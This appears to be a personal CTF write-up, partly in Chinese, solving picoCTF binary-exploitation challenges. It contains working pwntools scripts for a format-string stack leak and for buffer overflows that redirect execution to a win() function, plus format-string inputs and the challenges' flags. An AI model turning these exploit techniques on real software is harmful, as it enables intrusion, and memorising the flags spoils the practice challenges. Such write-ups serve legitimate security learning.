---
title: CTFs-pwn-1
date: 2024-06-02
tags: CTFs
categories: CTFs
description: PicoCTF pwn writeUp !
---

PicoCTF
==

Stonk
--


+ `buy_stonk()` 
```c=
int buy_stonks(Portfolio *p) {
    if (!p) {
        return 1;
    }
    char api_buf[FLAG_BUFFER];
    FILE *f = fopen("api","r");
    if (!f) {
        printf("Flag file not found. Contact an admin.\n");
        exit(1);
    }
    fgets(api_buf, FLAG_BUFFER, f);

    int money = p->money;
    int shares = 0;
    Stonk *temp = NULL;
    printf("Using patented AI algorithms to buy stonks\n");
    while (money > 0) {
        shares = (rand() % money) + 1;
        temp = pick_symbol_with_AI(shares);
        temp->next = p->head;
        p->head = temp;
        money -= shares;
    }
    printf("Stonks chosen\n");

    // TODO: Figure out how to read token from file, for now just ask

    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);
    printf("Buying stonks with token:\n");
    printf(user_buf);

    // TODO: Actually use key to interact with API

    view_portfolio(p);

    return 0;
}
```

+ User input
```c=
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```
>`printf(user_buf)`; 就是問題所在，printf 第一個參數必須先有一個格式字串，第二個參數以後才是變數，但這邊的用法直接是一個字串變數，所以我們可以自己輸入格式字串！
也就是我們可以自己輸入 %d, %s, %x 等等，那程式就會以為這是原本就有的格式字串，導致 printf 會因為你輸入的格式把後面記憶體位址的變數印出來。

```python=
from pwn import *

r = remote('mercury.picoctf.net',20195)

r.sendlineafter(b'2) View my portfolio',b'1\n')

r.recvuntil(b'What is your API token?')
r.sendline(b'%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')
# r.sendline(b'%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s')
r.recvline()
r.recvline()
s=r.recvline()
print(s)
l = s.split(b'-')

flag = b''
for i in l:
    i = int(i, base=16)
    flag+=pack(i, 32,'little')

if b'pico' in flag:
    print(flag)

r.close()
```
```python=
for i in l:
    i = int(i, base=16)
    flag+=pack(i, 32,'little')
```
+ `i = int(i, base=16)`：將十六進位數字轉換為整數。
+ `pack(i, 32, 'little')`：使用 pack 函數將整數 u 打包成 32 位元的小端字節序。這裡的 32 表示希望每個整數被打包為 32 位元，而 'little' 表示使用小端字節序（低位元組優先）。

`REF` : https://ithelp.ithome.com.tw/m/articles/10281425


two-sum
--

`c-int-%d`:  -2147483648至2147483647

13 digits decimal -> 42 digits binary
`21474836480` -> 0

+ `2147483647 ＋ 1~2147483647` 都會使其溢位
```txt=
2222222222220 ;-> 1724130188
2222222222230 ;-> 1724130188
```
`Flag`: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_482d8fc4}

`REF`: 
+ https://zh.wikipedia.org/zh-tw/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B_(C%E8%AF%AD%E8%A8%80) 
+ https://github.com/snwau/picoCTF-2023-Writeup/blob/main/Binary%20Exploitation/two-sum/two-sum.md


clutter-overflow
--

`%llx` : **64 bits hex-sign-integer**
+ overflow to cover `code` to equal to `0xdeadbeef`

`Flag`: picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}


Unsubscriptions Are Free
--

`use-after-free`: UAF


`REF`: https://ctftime.org/writeup/34455

RPS
--

`strstr() function`

sol: input `rock paper scissors` for 5 times

`Flag`: picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}


buffer overflow 1
--
`buffer overflow`

+ buf size = 32 -> 0x20
+ **disassembler to find address of** `win()`

```python=
from pwn import remote,p32

r= remote('saturn.picoctf.net',53563)

r.recvline()
r.sendline(b'a'*44+p32(0x80491f6)) # jump to win function

print(r.recvall().decode())

r.close()
```

`Flag`: picoCTF{addr3ss3s_ar3_3asy_b15b081e}


buffer overflow 2
--

+ `pattern_create` & `pattern_offset` ,or `patts` 找 溢出點
+ 因 `int main(int argc, char **argv)` 所以call完`win()` 需要再給`argc & argv`的數值


```python=
from pwn import remote,p32,context

# nc saturn.picoctf.net 49783
context.arch = 'i386'

r = remote('saturn.picoctf.net',50688)

r.recv()

# 0xCAFEF00D 0xcafef00d
# 0xF00DF00D 0xf00df00d
p1 = b'a'*112 +p32(0x8049296) +p32(0x8049372)+ p32(0xcafef00d) +p32(0xf00df00d)

r.send(p1)

r.interactive()
```

`REF`: https://hackmd.io/@Awwwolf/SJu6P-072
`Flag`: picoCTF{argum3nt5_4_d4yZ_59cd5643}


filtered-shellcode
--
> [online ass](https://defuse.ca/online-x86-assembler.htm#disassembly2) , [shell-storm](https://shell-storm.org/shellcode/index.html)
+  `shellcode 只能包含 2 位元組指令`


`REF`: https://ctftime.org/writeup/27464
`flag`: picoCTF{th4t_w4s_fun_bf8b48641b742e27}

Picker IV
--
![image](https://hackmd.io/_uploads/HJAiZQaWA.png)

SOL: input `4012a3`

`flag` : picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}


format string 0
--

> About `printf()` vuln [All the format strings](https://www.fabbbe.se/blog/all_the_format_strings.html )

`$man 3 printf` 手冊
### Sol:
1. `Gr%114d_Cheese`
2. `Cla%sic_Che%s%steak`

`flag`:picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}

### ex

* `%s` expects a char * 並插入該字符串。
* `%d` expects a int 並插入該整數的十進制表示。
* `%x` expects a unsigned int 並將其打印為十六進制。
* `%p` expects any 指針並將該指針打印為地址。
* `%n` expects a pointer 指向整數並將打印的字節數寫入該地址。

+ example of `%n`

```c=
int bytes_written;
printf("Hello, world!%n", &bytes_written);
printf("The number of bytes written is: %d\n", bytes_written);
```

```c
signal(SIGSEGV, sigsegv_handler); // SIGSEGV : “段錯誤”（Segmentation Violation）
```

[Pwn.College](https://pwn.college/)
==
